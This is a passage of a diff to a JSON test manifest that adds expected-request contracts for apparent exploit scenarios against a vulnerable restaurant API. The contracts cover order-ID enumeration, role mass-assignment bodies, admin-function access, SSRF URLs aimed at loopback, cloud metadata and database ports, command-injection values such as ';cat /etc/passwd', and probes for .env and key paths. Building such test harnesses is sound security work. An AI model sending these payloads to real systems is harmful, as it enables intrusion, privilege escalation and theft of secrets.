@@ -3578,7 +3578,261 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "order-1",
+            "method": "GET",
+            "path": "/restaurant/orders/1",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-2",
+            "method": "GET",
+            "path": "/restaurant/orders/2",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-3",
+            "method": "GET",
+            "path": "/restaurant/orders/3",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-4",
+            "method": "GET",
+            "path": "/restaurant/orders/4",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-5",
+            "method": "GET",
+            "path": "/restaurant/orders/5",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-6",
+            "method": "GET",
+            "path": "/restaurant/orders/6",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-7",
+            "method": "GET",
+            "path": "/restaurant/orders/7",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-8",
+            "method": "GET",
+            "path": "/restaurant/orders/8",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-9",
+            "method": "GET",
+            "path": "/restaurant/orders/9",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-10",
+            "method": "GET",
+            "path": "/restaurant/orders/10",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-11",
+            "method": "GET",
+            "path": "/restaurant/orders/11",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-12",
+            "method": "GET",
+            "path": "/restaurant/orders/12",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-13",
+            "method": "GET",
+            "path": "/restaurant/orders/13",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-14",
+            "method": "GET",
+            "path": "/restaurant/orders/14",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-15",
+            "method": "GET",
+            "path": "/restaurant/orders/15",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-16",
+            "method": "GET",
+            "path": "/restaurant/orders/16",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-17",
+            "method": "GET",
+            "path": "/restaurant/orders/17",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-18",
+            "method": "GET",
+            "path": "/restaurant/orders/18",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-19",
+            "method": "GET",
+            "path": "/restaurant/orders/19",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-20",
+            "method": "GET",
+            "path": "/restaurant/orders/20",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-100",
+            "method": "GET",
+            "path": "/restaurant/orders/100",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-999",
+            "method": "GET",
+            "path": "/restaurant/orders/999",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-1000",
+            "method": "GET",
+            "path": "/restaurant/orders/1000",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-9999",
+            "method": "GET",
+            "path": "/restaurant/orders/9999",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "order-99999",
+            "method": "GET",
+            "path": "/restaurant/orders/99999",
+            "payload_class": "authenticated-order-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "restaurant-exploits/04-bopla-mass-assign",
@@ -3591,7 +3845,77 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "role-0",
+            "method": "PATCH",
+            "path": "/restaurant/profile",
+            "payload_class": "role-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"role\":\"Chef\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "role-1",
+            "method": "PATCH",
+            "path": "/restaurant/profile",
+            "payload_class": "role-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"role\":\"Admin\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "role-2",
+            "method": "PATCH",
+            "path": "/restaurant/profile",
+            "payload_class": "role-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"role\":\"Manager\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "role-3",
+            "method": "PATCH",
+            "path": "/restaurant/profile",
+            "payload_class": "role-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"is_admin\":true}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "role-4",
+            "method": "PATCH",
+            "path": "/restaurant/profile",
+            "payload_class": "role-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"is_staff\":true}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "role-5",
+            "method": "PATCH",
+            "path": "/restaurant/profile",
+            "payload_class": "role-mass-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"role\":\"Chef\",\"is_admin\":true}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "restaurant-exploits/05-bfla-privilege",
@@ -3604,7 +3928,133 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "delete-menu",
+            "method": "DELETE",
+            "path": "/restaurant/menu/1",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 2,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "change-role",
+            "method": "PUT",
+            "path": "/restaurant/users/update_role",
+            "payload_class": "customer-role-escalation",
+            "minimum_dispatches": 2,
+            "body_regex": "\"username\":\"customer_[0-9]+\",\"role\":\"Chef\"",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-0",
+            "method": "POST",
+            "path": "/restaurant/menu",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-1",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-2",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-3",
+            "method": "GET",
+            "path": "/restaurant/users",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-4",
+            "method": "DELETE",
+            "path": "/restaurant/users/1",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-5",
+            "method": "GET",
+            "path": "/restaurant/admin/stats",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "admin-6",
+            "method": "POST",
+            "path": "/restaurant/admin/reset",
+            "payload_class": "customer-function-access",
+            "minimum_dispatches": 1,
+            "body_exact": "{}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "no-auth-0",
+            "method": "GET",
+            "path": "/restaurant/users",
+            "payload_class": "unauthenticated-function-access",
+            "minimum_dispatches": 1,
+            "absent_headers": ["authorization"]
+          },
+          {
+            "id": "no-auth-1",
+            "method": "GET",
+            "path": "/restaurant/admin/stats",
+            "payload_class": "unauthenticated-function-access",
+            "minimum_dispatches": 1,
+            "absent_headers": ["authorization"]
+          },
+          {
+            "id": "no-auth-2",
+            "method": "DELETE",
+            "path": "/restaurant/menu/1",
+            "payload_class": "unauthenticated-function-access",
+            "minimum_dispatches": 1,
+            "absent_headers": ["authorization"]
+          }
+        ]
+      }
     },
     {
       "id": "restaurant-exploits/06-ssrf-menu-image",
@@ -3617,7 +4067,154 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "internal-0",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://127.0.0.1:8091/admin/reset-chef-password\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-1",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://169.254.169.254/latest/meta-data/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-2",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://localhost:80/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-3",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://[::1]:80/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-4",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://127.0.0.1:6379/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-5",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://127.0.0.1:3306/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-6",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://localhost:8080/actuator/env\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-7",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://0.0.0.0:80/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-8",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://127.0.0.1:8091/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-9",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://0x7f000001/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-10",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://2130706433/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-11",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://017700000001/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "internal-12",
+            "method": "PUT",
+            "path": "/restaurant/menu/1",
+            "payload_class": "ssrf-image-url",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"image_url\":\"http://127.1/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "restaurant-exploits/07-command-injection",
@@ -3630,7 +4227,128 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "command-0",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": ";whoami"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-1",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": ";id"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-2",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": ";cat /etc/passwd"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-3",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": "|whoami"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-4",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": "$(whoami)"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-5",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": "`whoami`"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-6",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": "&&whoami"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-7",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": ";ls -la /"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "command-8",
+            "method": "GET",
+            "path": "/restaurant/admin/stats/disk",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "parameters": ";env"
+            },
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "restaurant-exploits/08-full-escalation-chain",
@@ -3669,7 +4387,326 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "openapi",
+            "method": "GET",
+            "path": "/restaurant/openapi.json",
+            "payload_class": "openapi-discovery",
+            "minimum_dispatches": 2
+          },
+          {
+            "id": "path-0",
+            "method": "GET",
+            "path": "/restaurant/admin",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-1",
+            "method": "GET",
+            "path": "/restaurant/users",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-2",
+            "method": "GET",
+            "path": "/restaurant/config",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-3",
+            "method": "GET",
+            "path": "/restaurant/debug",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-4",
+            "method": "GET",
+            "path": "/restaurant/internal",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-5",
+            "method": "GET",
+            "path": "/restaurant/metrics",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-6",
+            "method": "GET",
+            "path": "/restaurant/docs",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-7",
+            "method": "GET",
+            "path": "/restaurant/health",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-8",
+            "method": "GET",
+            "path": "/restaurant/swagger",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-9",
+            "method": "GET",
+            "path": "/restaurant/redoc",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-10",
+            "method": "GET",
+            "path": "/restaurant/graphql",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-11",
+            "method": "GET",
+            "path": "/restaurant/api",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-12",
+            "method": "GET",
+            "path": "/restaurant/v1",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-13",
+            "method": "GET",
+            "path": "/restaurant/v2",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-14",
+            "method": "GET",
+            "path": "/restaurant/status",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-15",
+            "method": "GET",
+            "path": "/restaurant/info",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-16",
+            "method": "GET",
+            "path": "/restaurant/env",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-17",
+            "method": "GET",
+            "path": "/restaurant/actuator",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-18",
+            "method": "GET",
+            "path": "/restaurant/console",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-19",
+            "method": "GET",
+            "path": "/restaurant/backup",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-20",
+            "method": "GET",
+            "path": "/restaurant/dump",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-21",
+            "method": "GET",
+            "path": "/restaurant/test",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-22",
+            "method": "GET",
+            "path": "/restaurant/secret",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-23",
+            "method": "GET",
+            "path": "/restaurant/keys",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-24",
+            "method": "GET",
+            "path": "/restaurant/tokens",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-25",
+            "method": "GET",
+            "path": "/restaurant/logs",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-26",
+            "method": "GET",
+            "path": "/restaurant/trace",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-27",
+            "method": "GET",
+            "path": "/restaurant/debug/vars",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-28",
+            "method": "GET",
+            "path": "/restaurant/debug/pprof",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-29",
+            "method": "GET",
+            "path": "/restaurant/.env",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-30",
+            "method": "GET",
+            "path": "/restaurant/robots.txt",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "path-31",
+            "method": "GET",
+            "path": "/restaurant/sitemap.xml",
+            "payload_class": "endpoint-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "docs-0",
+            "method": "GET",
+            "path": "/restaurant/docs",
+            "payload_class": "documentation-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "docs-1",
+            "method": "GET",
+            "path": "/restaurant/redoc",
+            "payload_class": "documentation-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "docs-2",
